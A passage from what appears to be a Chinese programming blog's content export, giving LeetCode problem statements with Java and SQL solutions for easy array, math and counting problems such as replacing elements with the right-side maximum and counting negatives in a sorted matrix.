<p>因为题目限制num[i]不会超过100。但是题目有顺序要求，解法错误</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] decompressRLElist(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>[] values = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">101</span>]; </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; nums.length;i += <span class="number">2</span>) &#123;</span><br><span class="line">            values[nums[i]] = nums[i - <span class="number">1</span>];</span><br><span class="line">            count += nums[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[count];</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">101</span>;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> != values[i]) &#123;</span><br><span class="line">                <span class="keyword">while</span> (values[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    values[i] -= <span class="number">1</span>;</span><br><span class="line">                    result[index++] = i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>直接遍历</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public int[] decompressRLElist(int[] nums) &#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">        for (int i &#x3D; 1;i &lt; nums.length;i +&#x3D; 2) &#123;</span><br><span class="line">            while (nums[i - 1] &gt; 0) &#123;</span><br><span class="line">                list.add(nums[i]);</span><br><span class="line">                nums[i - 1] -&#x3D; 1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int[] result &#x3D; new int[list.size()];</span><br><span class="line">        for (int i &#x3D; 0;i &lt; list.size();i++) &#123;</span><br><span class="line">            result[i] &#x3D; list.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>1299. 将每个元素替换为右侧最大元素</title>
    <url>/2020/04/09/LeetCode/leetcode-001299-%E5%B0%86%E6%AF%8F%E4%B8%AA%E5%85%83%E7%B4%A0%E6%9B%BF%E6%8D%A2%E4%B8%BA%E5%8F%B3%E4%BE%A7%E6%9C%80%E5%A4%A7%E5%85%83%E7%B4%A0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个数组 <code>arr</code> ，请你将每个元素用它右边最大的元素替换，如果是最后一个元素，用 <code>-1</code> 替换。</p>
<p>完成所有替换操作后，请你返回这个数组。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [17,18,5,4,6,1]</span><br><span class="line">输出：[18,6,6,6,1,-1]</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [555,901,482,1771]</span><br><span class="line">输出：1 </span><br><span class="line">解释： </span><br><span class="line">只有 1771 是位数为偶数的数字。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= arr.length &lt;= 10^4</code></li>
<li><code>1 &lt;= arr[i] &lt;= 10^5</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>逆序遍历。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] replaceElements(<span class="keyword">int</span>[] arr) &#123;</span><br><span class="line">		<span class="keyword">int</span>[] result = <span class="keyword">new</span> <span class="keyword">int</span>[arr.length];</span><br><span class="line">		result[result.length - <span class="number">1</span>] = -<span class="number">1</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = arr.length - <span class="number">2</span>;i &gt;= <span class="number">0</span>;i--) &#123;</span><br><span class="line">			result[i] = Math.max(result[i + <span class="number">1</span>], arr[i + <span class="number">1</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>1323. 6 和 9 组成的最大数字</title>
    <url>/2020/04/09/LeetCode/leetcode-001323-6%20%E5%92%8C%209%20%E7%BB%84%E6%88%90%E7%9A%84%E6%9C%80%E5%A4%A7%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个仅由数字 6 和 9 组成的正整数 num。</p>
<p>你最多只能翻转一位数字，将 6 变成 9，或者把 9 变成 6 。</p>
<p>请返回你可以得到的最大数字</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 9669</span><br><span class="line">输出：9969</span><br><span class="line">解释：</span><br><span class="line">改变第一位数字可以得到 6669 。</span><br><span class="line">改变第二位数字可以得到 9969 。</span><br><span class="line">改变第三位数字可以得到 9699 。</span><br><span class="line">改变第四位数字可以得到 9666 。</span><br><span class="line">其中最大的数字是 9969 。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：num = <span class="number">9996</span></span><br><span class="line">输出：<span class="number">9999</span></span><br><span class="line">解释：将最后一位从 <span class="number">6</span> 变到 <span class="number">9</span>，其结果 <span class="number">9999</span> 是最大的数。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 9999</span><br><span class="line">输出：9999</span><br><span class="line">解释：无需改变就已经是最大的数字了。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= num &lt;= 10^4</code></li>
<li><code>num</code> 每一位上的数字都是 6 或者 9 。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>数字转为字符串，处理之后，再转回为数字</p>
<p>因为题目限制num为正整数，所以，只考虑从6变成9的场景即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximum69Number</span> <span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">        String strNum = String.valueOf(num);</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c : strNum.toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (flag &amp;&amp; <span class="string">'6'</span> == c) &#123;</span><br><span class="line">                sb.append(<span class="string">'9'</span>);</span><br><span class="line">                flag = <span class="keyword">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sb.append(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Integer.parseInt(sb.toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>1266. 访问所有点的最小时间</title>
    <url>/2020/04/09/LeetCode/leetcode-001266-%E8%AE%BF%E9%97%AE%E6%89%80%E6%9C%89%E7%82%B9%E7%9A%84%E6%9C%80%E5%B0%8F%E6%97%B6%E9%97%B4/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>平面上有 <code>n</code> 个点，点的位置用整数坐标表示 <code>points[i] = [xi, yi]</code>。请你计算访问所有这些点需要的最小时间（以秒为单位）。</p>
<p>你可以按照下面的规则在平面上移动：</p>
<ul>
<li>每一秒沿水平或者竖直方向移动一个单位长度，或者跨过对角线（可以看作在一秒内向水平和竖直方向各移动一个单位长度）。</li>
<li>必须按照数组中出现的顺序来访问这些点。</li>
</ul>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2019/11/24/1626_example_1.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：points &#x3D; [[1,1],[3,4],[-1,0]]</span><br><span class="line">输出：7</span><br><span class="line">解释：一条最佳的访问路径是： [1,1] -&gt; [2,2] -&gt; [3,3] -&gt; [3,4] -&gt; [2,3] -&gt; [1,2] -&gt; [0,1] -&gt; [-1,0]   </span><br><span class="line">从 [1,1] 到 [3,4] 需要 3 秒 </span><br><span class="line">从 [3,4] 到 [-1,0] 需要 4 秒</span><br><span class="line">一共需要 7 秒</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：points = [[<span class="number">3</span>,<span class="number">2</span>],[-<span class="number">2</span>,<span class="number">2</span>]]</span><br><span class="line">输出：<span class="number">5</span></span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>points.length == n</li>
<li>1 &lt;= n &lt;= 100</li>
<li>points[i].length == 2</li>
<li>-1000 &lt;= points[i][0], points[i][1] &lt;= 1000</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>从一个点p1到移动到另外一个点p2，所需要的步数，就是max(abs(p2.x - p1.x), abs(p2.y - p1.y))。也就是它们x轴或者y轴之差的绝对值的最大值。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minTimeToVisitAllPoints</span><span class="params">(<span class="keyword">int</span>[][] points)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; points.length;i++) &#123;</span><br><span class="line">            sum += Math.max(Math.abs(points[i][<span class="number">0</span>] - points[i - <span class="number">1</span>][<span class="number">0</span>]), Math.abs(points[i][<span class="number">1</span>] - points[i - <span class="number">1</span>][<span class="number">1</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>1303. 求团队人数</title>
    <url>/2020/04/09/LeetCode/leetcode-001303-%E6%B1%82%E5%9B%A2%E9%98%9F%E4%BA%BA%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>员工表：<code>Employee</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------+---------+</span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">| employee_id   | int     |</span><br><span class="line">| team_id       | int     |</span><br><span class="line">+---------------+---------+</span><br><span class="line">employee_id 字段是这张表的主键，表中的每一行都包含每个员工的 ID 和他们所属的团队。</span><br></pre></td></tr></table></figure>

<p>编写一个 SQL 查询，以求得每个员工所在团队的总人数。</p>
<p>查询结果中的顺序无特定要求。</p>
<p>查询结果格式示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Employee Table:</span><br><span class="line">+-------------+------------+</span><br><span class="line">| employee_id | team_id    |</span><br><span class="line">+-------------+------------+</span><br><span class="line">|     1       |     8      |</span><br><span class="line">|     2       |     8      |</span><br><span class="line">|     3       |     8      |</span><br><span class="line">|     4       |     7      |</span><br><span class="line">|     5       |     9      |</span><br><span class="line">|     6       |     9      |</span><br><span class="line">+-------------+------------+</span><br><span class="line">Result table:</span><br><span class="line">+-------------+------------+</span><br><span class="line">| employee_id | team_size  |</span><br><span class="line">+-------------+------------+</span><br><span class="line">|     1       |     3      |</span><br><span class="line">|     2       |     3      |</span><br><span class="line">|     3       |     3      |</span><br><span class="line">|     4       |     1      |</span><br><span class="line">|     5       |     2      |</span><br><span class="line">|     6       |     2      |</span><br><span class="line">+-------------+------------+</span><br><span class="line">ID 为 1、2、3 的员工是 team_id 为 8 的团队的成员，</span><br><span class="line">ID 为 4 的员工是 team_id 为 7 的团队的成员，</span><br><span class="line">ID 为 5、6 的员工是 team_id 为 9 的团队的成员。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>子查询</p>
<h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">select employee_id, (<span class="function">select <span class="title">count</span><span class="params">(*)</span> from Employee e2  where e1.team_id </span>= e2.team_id) as team_size from Employee e1</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>左连接</p>
<h4 id="SQL-1"><a href="#SQL-1" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">select e1.employee_id, count(*) team_size from employee e1 left join employee e2 on e1.team_id = e2.team_id group by e1.employee_id;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>1342. 将数字变成 0 的操作次数</title>
    <url>/2020/04/09/LeetCode/leetcode-001342-%E5%B0%86%E6%95%B0%E5%AD%97%E5%8F%98%E6%88%90%200%20%E7%9A%84%E6%93%8D%E4%BD%9C%E6%AC%A1%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个非负整数 <code>num</code> ，请你返回将它变成 0 所需要的步数。 如果当前数字是偶数，你需要把它除以 2 ；否则，减去 1 。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 14</span><br><span class="line">输出：6</span><br><span class="line">解释：</span><br><span class="line">步骤 1) 14 是偶数，除以 2 得到 7 。</span><br><span class="line">步骤 2） 7 是奇数，减 1 得到 6 。</span><br><span class="line">步骤 3） 6 是偶数，除以 2 得到 3 。</span><br><span class="line">步骤 4） 3 是奇数，减 1 得到 2 。</span><br><span class="line">步骤 5） 2 是偶数，除以 2 得到 1 。</span><br><span class="line">步骤 6） 1 是奇数，减 1 得到 0 。</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 8</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">步骤 1） 8 是偶数，除以 2 得到 4 。</span><br><span class="line">步骤 2） 4 是偶数，除以 2 得到 2 。</span><br><span class="line">步骤 3） 2 是偶数，除以 2 得到 1 。</span><br><span class="line">步骤 4） 1 是奇数，减 1 得到 0 。</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 123</span><br><span class="line">输出：12</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 &lt;&#x3D; num &lt;&#x3D; 10^6</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numberOfSteps</span> <span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">0</span> != num) &#123;</span><br><span class="line">            <span class="keyword">if</span> (num % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                num /= <span class="number">2</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                num -= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>改写为递归</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public int numberOfSteps (int num) &#123;</span><br><span class="line">        if (0 &#x3D;&#x3D; num) &#123;</span><br><span class="line">            return num;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (1 &#x3D;&#x3D; num % 2) &#123;</span><br><span class="line">            return numberOfSteps(num - 1) + 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return numberOfSteps(num &gt;&gt; 1) + 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>三目运算符加递归</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public int numberOfSteps (int num) &#123;</span><br><span class="line">        return num &gt; 1 ? 1 + (num % 2) + numberOfSteps(num &gt;&gt; 1) : num;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>LCP 猜数字</title>
    <url>/2020/04/09/LeetCode/leetcode-LCP-1-%E7%8C%9C%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>小A 和 小B 在玩猜数字。小B 每次从 1, 2, 3 中随机选择一个，小A 每次也从 1, 2, 3 中选择一个猜。他们一共进行三次这个游戏，请返回 小A 猜对了几次？</p>
<p>输入的<code>guess</code>数组为 小A 每次的猜测，<code>answer</code>数组为 小B 每次的选择。<code>guess</code>和<code>answer</code>的长度都等于3。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1:"></a>示例1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：guess &#x3D; [1,2,3], answer &#x3D; [1,2,3]</span><br><span class="line">输出：3</span><br><span class="line">解释：小A 每次都猜对了。</span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2:"></a>示例2:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：guess &#x3D; [2,2,3], answer &#x3D; [3,2,1]</span><br><span class="line">输出：1</span><br><span class="line">解释：小A 只猜对了第二次。</span><br></pre></td></tr></table></figure>

<h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><ol>
<li><code>guess</code>的长度 = 3</li>
<li><code>answer</code>的长度 = 3</li>
<li><code>guess</code>的元素取值为 <code>{1, 2, 3}</code> 之一。</li>
<li><code>answer</code>的元素取值为 <code>{1, 2, 3}</code> 之一。</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>直接比较</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">game</span><span class="params">(<span class="keyword">int</span>[] guess, <span class="keyword">int</span>[] answer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (guess[<span class="number">0</span>] == answer[<span class="number">0</span>] ? <span class="number">1</span> : <span class="number">0</span>) + (guess[<span class="number">1</span>] == answer[<span class="number">1</span>] ? <span class="number">1</span> : <span class="number">0</span>) + (guess[<span class="number">2</span>] == answer[<span class="number">2</span>] ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>1351. 统计有序矩阵中的负数</title>
    <url>/2020/04/09/LeetCode/leetcode-001351-%E7%BB%9F%E8%AE%A1%E6%9C%89%E5%BA%8F%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B4%9F%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个 <code>m * n</code> 的矩阵 <code>grid</code>，矩阵中的元素无论是按行还是按列，都以非递增顺序排列。 </p>
<p>请你统计并返回 <code>grid</code> 中 <strong>负数</strong> 的数目。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[4,3,2,-1],[3,2,1,-1],[1,1,-1,-2],[-1,-1,-2,-3]]</span><br><span class="line">输出：8</span><br><span class="line">解释：矩阵中共有 8 个负数。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[3,2],[1,0]]</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>



<h2 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[1,-1],[-1,-1]]</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[-1]]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>m == grid.length</li>
<li>n == grid[i].length</li>
<li>1 &lt;= m, n &lt;= 100</li>
<li>-100 &lt;= grid[i][j] &lt;= 100</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>暴力搜索，遍历每一行，碰到小于0的，就停止搜索当前行，搜索下一行</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countNegatives</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; grid.length;i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; grid[i].length;j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    count += grid[i].length - j;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>二分查找，在搜索当前行小于0的数的索引的时候，采用二分查找<br>参考<a href="https://leetcode-cn.com/problems/count-negative-numbers-in-a-sorted-matrix/solution/er-fen-cha-zhao-dai-ma-pei-zhu-shi-by-lzhlyle/" target="_blank" rel="noopener">这里</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countNegatives</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>, m = grid.length, n = grid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] row = grid[i];</span><br><span class="line">        <span class="keyword">if</span> (row[n - <span class="number">1</span>] &gt;= <span class="number">0</span>) <span class="keyword">continue</span>; <span class="comment">// 整行非负，跳过</span></span><br><span class="line">        <span class="keyword">if</span> (row[<span class="number">0</span>] &lt; <span class="number">0</span>) &#123; <span class="comment">// 整行负数</span></span><br><span class="line">            count += (m - i) * n; <span class="comment">// 后面的行也计入</span></span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 无需再继续遍历</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> first = _binarySearch(row); <span class="comment">// 当前行二分查找第一个小于 0 的数的索引</span></span><br><span class="line">        count += n - first;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找第一个小于 0 的数的索引</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">_binarySearch</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> begin = <span class="number">0</span>, end = arr.length;</span><br><span class="line">    <span class="keyword">while</span> (begin &lt; end) &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = begin + ((end - begin) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (arr[mid] &gt;= <span class="number">0</span>) begin = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// 负数之后，还要再判断前一个不是负数</span></span><br><span class="line">            <span class="keyword">if</span> (arr[mid - <span class="number">1</span>] &gt;= <span class="number">0</span>) <span class="keyword">return</span> mid;</span><br><span class="line">            end = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> begin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>从后面向前遍历</p>
<p>参考<a href="https://leetcode-cn.com/problems/count-negative-numbers-in-a-sorted-matrix/solution/tong-ji-you-xu-ju-zhen-zhong-de-fu-shu-by-leetcode/" target="_blank" rel="noopener">这里</a></p>
